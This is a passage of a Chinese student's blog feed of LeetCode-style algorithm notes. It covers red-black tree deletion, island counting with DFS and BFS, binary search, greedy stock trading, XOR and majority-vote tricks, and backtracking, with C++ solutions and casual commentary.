leftRotate(z-&gt;parent-&gt;parent);<br>                &#125;<br>            &#125;<br>        &#125;<br>        root-&gt;color = BLACK;<br>    &#125;<br><br>    <span class="hljs-comment">// 移植 顶替</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">transplant</span><span class="hljs-params">(Node* u, Node* v)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u-&gt;parent == NIL)<br>            root = v;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (u == u-&gt;parent-&gt;left)<br>            u-&gt;parent-&gt;left = v;<br>        <span class="hljs-keyword">else</span><br>            u-&gt;parent-&gt;right = v;<br>        v-&gt;parent = u-&gt;parent;<br>    &#125;<br><br>    Node* <span class="hljs-title function_">minimum</span><span class="hljs-params">(Node* x)</span> &#123;<br>        <span class="hljs-keyword">while</span> (x-&gt;left != NIL)<br>            x = x-&gt;left;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">deleteFix</span><span class="hljs-params">(Node* x)</span> &#123;<br>        <span class="hljs-keyword">while</span> (x != root &amp;&amp; x-&gt;color == BLACK) &#123;<br>            <span class="hljs-keyword">if</span> (x == x-&gt;parent-&gt;left) &#123;<br>                Node* w = x-&gt;parent-&gt;right;<br>                <span class="hljs-keyword">if</span> (w-&gt;color == RED) &#123; <span class="hljs-comment">// 兄弟是红色</span><br>                    w-&gt;color = BLACK;  <span class="hljs-comment">// 兄父变色 朝双黑旋转 保持双黑继续调整</span><br>                    x-&gt;parent-&gt;color = RED;<br>                    leftRotate(x-&gt;parent);<br>                    w = x-&gt;parent-&gt;right;<br>                &#125;<br>                <span class="hljs-comment">// 兄弟是黑色</span><br>                <span class="hljs-keyword">if</span> (w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK) &#123;<br>                    <span class="hljs-comment">// 兄弟的孩子都是黑色 兄弟变红 双黑上移(遇红or根变单黑)</span><br>                    w-&gt;color = RED;<br>                    x = x-&gt;parent;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 兄弟至少有一个红孩子 变色(双黑变单黑) + 旋转(LL,RR,LR,RL)</span><br>                    <span class="hljs-keyword">if</span> (w-&gt;right-&gt;color == BLACK) &#123;<br>                        w-&gt;left-&gt;color = BLACK;<br>                        w-&gt;color = RED;<br>                        rightRotate(w);<br>                        w = x-&gt;parent-&gt;right;<br>                    &#125;<br>                    <span class="hljs-comment">// 变色逻辑</span><br>                    w-&gt;color = x-&gt;parent-&gt;color;<br>                    x-&gt;parent-&gt;color = BLACK;<br>                    w-&gt;right-&gt;color = BLACK;<br>                    leftRotate(x-&gt;parent);<br>                    x = root;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 对称</span><br>                Node* w = x-&gt;parent-&gt;left;<br>                <span class="hljs-keyword">if</span> (w-&gt;color == RED) &#123;<br>                    w-&gt;color = BLACK;<br>                    x-&gt;parent-&gt;color = RED;<br>                    rightRotate(x-&gt;parent);<br>                    w = x-&gt;parent-&gt;left;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK) &#123;<br>                    w-&gt;color = RED;<br>                    x = x-&gt;parent;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (w-&gt;left-&gt;color == BLACK) &#123;<br>                        w-&gt;right-&gt;color = BLACK;<br>                        w-&gt;color = RED;<br>                        leftRotate(w);<br>                        w = x-&gt;parent-&gt;left;<br>                    &#125;<br>                    w-&gt;color = x-&gt;parent-&gt;color;<br>                    x-&gt;parent-&gt;color = BLACK;<br>                    w-&gt;left-&gt;color = BLACK;<br>                    rightRotate(x-&gt;parent);<br>                    x = root;<br>                &#125;<br>            &#125;<br>        &#125;<br>        x-&gt;color = BLACK;<br>    &#125;<br><br>public:<br>    RBTree() &#123;<br>        NIL = new Node(<span class="hljs-number">0</span>);<br>        NIL-&gt;color = BLACK;<br>        NIL-&gt;left = NIL-&gt;right = NIL;<br>        NIL-&gt;parent = NIL;<br>        root = NIL;<br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> &#123;<br>        Node* z = new Node(key);<br>        z-&gt;left = z-&gt;right = NIL;<br>        z-&gt;parent = NIL;<br><br>        Node* y = NIL;<br>        Node* x = root;<br>        <span class="hljs-keyword">while</span> (x != NIL) &#123;<br>            y = x;<br>            x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;<br>        &#125;<br><br>        z-&gt;parent = y;<br>        <span class="hljs-keyword">if</span> (y == NIL)<br>            root = z;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt; y-&gt;key)<br>            y-&gt;left = z;<br>        <span class="hljs-keyword">else</span><br>            y-&gt;right = z;<br><br>        z-&gt;color = RED; <span class="hljs-comment">// 无脑置红</span><br>        insertFix(z);   <span class="hljs-comment">// 插入修复</span><br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> &#123;<br>        Node* z = root;<br>        <span class="hljs-keyword">while</span> (z != NIL &amp;&amp; z-&gt;key != key) &#123;<br>            z = (key &lt; z-&gt;key) ? z-&gt;left : z-&gt;right;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (z == NIL)<br>            <span class="hljs-keyword">return</span>;<br><br>        Node* y = z; <span class="hljs-comment">// y 是最终要被删的节点</span><br>        Color yColor = y-&gt;color;<br>        Node* x;<br><br>        <span class="hljs-comment">// 只有左/右孩子 代替后变黑</span><br>        <span class="hljs-keyword">if</span> (z-&gt;left == NIL) &#123;<br>            x = z-&gt;right;<br>            transplant(z, z-&gt;right);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (z-&gt;right == NIL) &#123;<br>            x = z-&gt;left;<br>            transplant(z, z-&gt;left);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 有两个孩子</span><br>            y = minimum(z-&gt;right);<br>            yColor = y-&gt;color;<br>            x = y-&gt;right;<br><br>            <span class="hljs-comment">// 逆天...</span><br>            <span class="hljs-keyword">if</span> (y-&gt;parent != z) &#123;<br>                transplant(y, y-&gt;right);<br>                y-&gt;right = z-&gt;right;<br>                y-&gt;right-&gt;parent = y;<br>            &#125;<br><br>            transplant(z, y);<br>            y-&gt;left = z-&gt;left;<br>            y-&gt;left-&gt;parent = y;<br>            y-&gt;color = z-&gt;color;<br>        &#125;<br><br>        <span class="hljs-comment">// 没有孩子 红色直接删除 黑色分类讨论</span><br>        <span class="hljs-keyword">if</span> (yColor == BLACK)<br>            deleteFix(x);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>还有好多树啊…</p><p>慢慢来…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>二叉树</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图论</title>
    <link href="/2026/01/19/%E5%9B%BE%E8%AE%BA/"/>
    <url>/2026/01/19/%E5%9B%BE%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h1><p><strong>图</strong>是什么???</p><p>感觉好神秘啊</p><p>我也不知道</p><p>但是</p><p>应该是一种神秘的数据结构吧!</p><p>(我还没学离散数学 先摆了! 虽然好像没什么关系 但是先摆了!)</p><h2 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title="200.岛屿数量"></a>200.岛屿数量</h2><p><img src="/images/46.png" alt="如图"></p><p>深度优先算法和广度优先算法</p><p>应该蛮好理解的吧…</p><h3 id="DFS解法"><a href="#DFS解法" class="headerlink" title="DFS解法"></a>DFS解法</h3><p><strong>深度优先搜索</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> m,n;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid,<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span>||x&gt;=m||y&lt;<span class="hljs-number">0</span>||y&gt;=n||grid[x][y]==<span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">//越界 or 遇到水 直接停</span><br>        grid[x][y] = <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">//把当前陆地淹掉</span><br>        <span class="hljs-built_in">dfs</span>(grid,x<span class="hljs-number">+1</span>,y);<br>        <span class="hljs-built_in">dfs</span>(grid,x<span class="hljs-number">-1</span>,y);  <span class="hljs-comment">//四个方向递归</span><br>        <span class="hljs-built_in">dfs</span>(grid,x,y<span class="hljs-number">+1</span>);<br>        <span class="hljs-built_in">dfs</span>(grid,x,y<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        m = grid.<span class="hljs-built_in">size</span>();<br>        n = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)&#123;<br>                <span class="hljs-keyword">if</span>(grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                    count++;  <span class="hljs-comment">//发现一个新岛</span><br>                    <span class="hljs-built_in">dfs</span>(grid,i,j); <span class="hljs-comment">//淹掉整个岛屿</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="BFS解法"><a href="#BFS解法" class="headerlink" title="BFS解法"></a>BFS解法</h3><p><strong>广度优先搜索</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = grid.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>&#125;;<br>        <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>        queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; q;  <span class="hljs-comment">//队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                    count++;<br>                    grid[i][j] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>                    q.<span class="hljs-built_in">push</span>(&#123;i, j&#125;);<br>                    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>                        <span class="hljs-keyword">auto</span> [x, y] = q.<span class="hljs-built_in">front</span>();<br>                        q.<span class="hljs-built_in">pop</span>();<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>                            <span class="hljs-type">int</span> nx = x + dx[k];<br>                            <span class="hljs-type">int</span> ny = y + dy[k];<br>                            <span class="hljs-keyword">if</span> (nx &gt;= <span class="hljs-number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &gt;= <span class="hljs-number">0</span> &amp;&amp; ny &lt; n &amp;&amp;<br>                                grid[nx][ny] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                                grid[nx][ny] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>                                q.<span class="hljs-built_in">push</span>(&#123;nx, ny&#125;);<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二分</title>
    <link href="/2026/01/19/%E4%BA%8C%E5%88%86/"/>
    <url>/2026/01/19/%E4%BA%8C%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>一种在高中数学中便见过的算法思想</p><p>思想本身不难理解</p><p>难点在于边界的讨论</p><p>日后再写吧…</p><p>简单做了一道题…</p><h2 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35.搜索插入位置"></a>35.搜索插入位置</h2><p><img src="/images/45.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">searchInsert</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123; <br>            <span class="hljs-type">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;  <span class="hljs-comment">//二分法</span><br>            <span class="hljs-keyword">if</span> (nums[mid] == target) &#123;<br>                <span class="hljs-keyword">return</span> mid;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>二分查找</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2026/01/19/%E5%A0%86/"/>
    <url>/2026/01/19/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>我以为是啥呢</p><p>结果是一种树???</p><p>插眼…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>贪心</title>
    <link href="/2026/01/19/%E8%B4%AA%E5%BF%83/"/>
    <url>/2026/01/19/%E8%B4%AA%E5%BF%83/</url>
    
    <content type="html"><![CDATA[<h1 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h1><p>贪心算法</p><p>顾名思义</p><p>重点在贪心</p><p>即</p><p>每一步都做出当前看来最优选择的算法思想</p><p>其核心假设是</p><p>局部最优的选择，能够导向全局最优的结果</p><p>需要注意的是，这里的“最优”并非基于未来状态的全局搜索，而仅依赖于当前已知的信息</p><p>有点意思…</p><p>不过</p><p>你确定吗???</p><h2 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121.买卖股票的最佳时机"></a>121.买卖股票的最佳时机</h2><p>兄弟</p><p>学了这个能成为股神吗???</p><p><img src="/images/59.png" alt="如图"></p><p><code>贪心算法</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-type">int</span> minPrice = INT_MAX;<br>        <span class="hljs-type">int</span> maxProfit = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> price : prices)&#123;<br>            minPrice = <span class="hljs-built_in">min</span>(minPrice, price);<br>            maxProfit = <span class="hljs-built_in">max</span>(maxProfit, price - minPrice);<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxProfit;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>贪心</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>trick</title>
    <link href="/2026/01/19/trick/"/>
    <url>/2026/01/19/trick/</url>
    
    <content type="html"><![CDATA[<h1 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h1><p>一些小巧思</p><p>佩服古人的智慧!</p><h2 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136.只出现一次的数字"></a>136.只出现一次的数字</h2><p><img src="/images/32.png" alt="如图"></p><p>巧妙利用<strong>异或</strong>的性质</p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> c : nums)&#123;<br>            ans ^= c;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="169-多数元素"><a href="#169-多数元素" class="headerlink" title="169.多数元素"></a>169.多数元素</h2><p><img src="/images/33.png" alt="如图"></p><p><code>Boyer–Moore 投票算法</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> candidate = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>)&#123;<br>                candidate = nums[i];<br>            &#125;<br>            <span class="hljs-keyword">if</span>(nums[i] == candidate)&#123;<br>                count++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                count--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> candidate;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>异或</tag>
      
      <tag>trick</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回溯</title>
    <link href="/2026/01/19/%E5%9B%9E%E6%BA%AF/"/>
    <url>/2026/01/19/%E5%9B%9E%E6%BA%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h1><p>我觉得这个算法很有意思啊</p><p>有点像无限流小说中的那种不断重生探路，死亡回溯，直至找到最佳解法，杀出重围…</p><p>依旧插个眼</p><p>以后补…</p><h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22.括号生成"></a>22.括号生成</h2><p><img src="/images/27.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        vector&lt;string&gt; result;<br>        string current;<br>        <span class="hljs-built_in">backtrack</span>(result, current, n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(vector&lt;string&gt;&amp; result, string&amp; current, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> open, <span class="hljs-type">int</span> close)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (current.<span class="hljs-built_in">size</span>() == <span class="hljs-number">2</span> * n) &#123;<br>            result.<span class="hljs-built_in">push_back</span>(current);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 回溯!</span><br>        <span class="hljs-keyword">if</span> (open &lt; n) &#123;<br>            current.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;(&#x27;</span>);<br>            <span class="hljs-built_in">backtrack</span>(result, current, n, open + <span class="hljs-number">1</span>, close);<br>            current.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (close &lt; open) &#123;<br>            current.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;)&#x27;</span>);<br>            <span class="hljs-built_in">backtrack</span>(result, current, n, open, close + <span class="hljs-number">1</span>);<br>            current.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="路径之谜"><a href="#路径之谜" class="headerlink" title="路径之谜"></a>路径之谜</h2><p><img src="/images/54.png" alt="题目"></p><p><img src="/images/55.png" alt="格式"></p><p><code>剪枝 + 回溯 + DFS</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> north[<span class="hljs-number">15</span>], west[<span class="hljs-number">15</span>];<br><span class="hljs-type">bool</span> visited[<span class="hljs-number">15</span>][<span class="hljs-number">15</span>]; <span class="hljs-comment">//格子 (r,c) 是否已走过</span><br>vector&lt;<span class="hljs-type">int</span>&gt; path;<br><span class="hljs-type">bool</span> finished = <span 